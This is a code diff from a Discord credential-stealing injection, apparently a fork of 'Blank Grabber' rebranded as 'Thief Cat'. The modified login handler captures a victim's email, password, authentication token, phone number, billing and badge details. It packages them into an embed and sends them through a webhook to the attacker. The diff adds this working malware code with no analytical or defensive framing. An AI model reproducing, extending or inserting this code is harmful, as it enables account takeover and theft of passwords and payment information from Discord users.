@@ -625,37 +625,91 @@ const hooker = async content => {
   req.end();
 };
 const login = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: 'Blank Grabber Injection',
-    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
-    embeds: [{
-      color: 5639644,
-      fields: [{
-        name: '**Account Info**',
-        value: `Email: **${email}** - Password: **${password}**`,
-        inline: false
-      }, {
-        name: '**Discord Info**',
-        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-        inline: false
-      }, {
-        name: '**Token**',
-        value: `\`${token}\``,
-        inline: false
-      }],
-      author: {
-        name: json.username + '#' + json.discriminator + ' | ' + json.id,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-      }
-    }]
-  };
-  content.content = '@everyone';
-  hooker(content);
-};
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const phone = json.phone ? json.phone : 'None';
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
+  
+    const content = {
+      username: 'Thief Cat',
+      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
+      embeds: [
+        {
+          title: '🐾 Thief Cat User Login',
+          color: 5639644,
+          fields: [
+            {
+              name: 'Download pfp',
+              value: `[Download pfp](${avatarUrl})`,
+              inline: false
+            },
+            {
+              name: 'Username',
+              value: `\`${json.username}#${json.discriminator}\``,
+              inline: true
+            },
+            {
+              name: 'ID',
+              value: `\`${json.id}\``,
+              inline: true
+            },
+            {
+              name: 'Nitro',
+              value: `${nitro}`,
+              inline: true
+            },
+            {
+              name: 'Badges',
+              value: `${badges}`,
+              inline: true
+            },
+            {
+              name: 'Language',
+              value: `${json.locale}`,
+              inline: true
+            },
+            {
+              name: 'Phone',
+              value: `${phone}`,
+              inline: true
+            },
+            {
+              name: 'Billing',
+              value: `${billing}`,
+              inline: true
+            },
+            {
+              name: 'Email',
+              value: `\`${email}\``,
+              inline: true
+            },
+            {
+              name: 'Password',
+              value: `\`${password}\``,
+              inline: true
+            },
+            {
+              name: 'Token',
+              value: `\`\`\`${token}\`\`\``,
+              inline: false
+            }
+          ],
+          thumbnail: {
+            url: avatarUrl
+          },
+          footer: {
+            text: 'Thief Cat 2023 | https://github.com/FalseKSCH/',
+          }
+        }
+      ]
+    };
+  
+    // Trigger webhook
+    content.content = '@everyone';
+    hooker(content);
+  };  
 const passwordChanged = async (oldpassword, newpassword, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
